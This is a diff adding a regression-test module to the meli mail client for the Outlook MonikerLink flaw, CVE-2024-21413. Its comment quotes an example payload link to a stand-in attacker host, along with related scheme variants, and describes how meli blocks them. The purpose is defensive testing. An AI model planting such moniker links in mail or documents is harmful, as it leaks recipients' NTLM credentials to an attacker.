@@ -240,3 +240,31 @@ mod cve_2026_0818;
 #[cfg(test)]
 #[path = "CVE-2023-23397.rs"]
 mod cve_2023_23397;
+
+/// CVE-2024-21413 (Microsoft Outlook on Windows, CVSS 9.8, public PoC,
+/// exploited in the wild) MonikerLink regression (issue #22, table 2
+/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
+/// `file://` URL whose `!`-suffix makes Outlook resolve it as a COM
+/// moniker (`file://attacker.example/share/leak.html!Exploit`, with
+/// `file:\\`, `search-ms:` and `mhtml:` variants), embedded as a link
+/// in the mail body — clicking it bypassed Protected View and made
+/// the client dereference the attacker's share over SMB/WebDAV with
+/// the victim's NTLM credentials. meli has no Protected View, no COM
+/// moniker resolver and no SMB/NTLM client, so the equivalent
+/// surfaces — every place a mail-borne link spelling can reach the OS
+/// url launcher — are mapped and locked as an immunity proof: the
+/// `go_to_url` gate holds the whole moniker family (`file:`, with or
+/// without the `!` suffix, `mhtml:`, `search-ms:`, application
+/// monikers, UNC, every casing) behind an explicit per-URL
+/// confirmation, URL-mode extraction never yields a launchable
+/// moniker (the one documented nuance — an `mhtml:https://…` prefix
+/// is consumed by extraction, leaving a plain https link
+/// byte-identical to what any mail may carry by design — is locked
+/// with its mapping rationale), the HTML mirror's scheme-bearing
+/// hrefs die in `sanitize`, and the issue #21 header-derived launch
+/// sites skip `mhtml:`/`search-ms:`/`file:` options on the same
+/// whitelist. No gap was exposed on this corpus; no production code
+/// needed changing.
+#[cfg(test)]
+#[path = "CVE-2024-21413.rs"]
+mod cve_2024_21413;
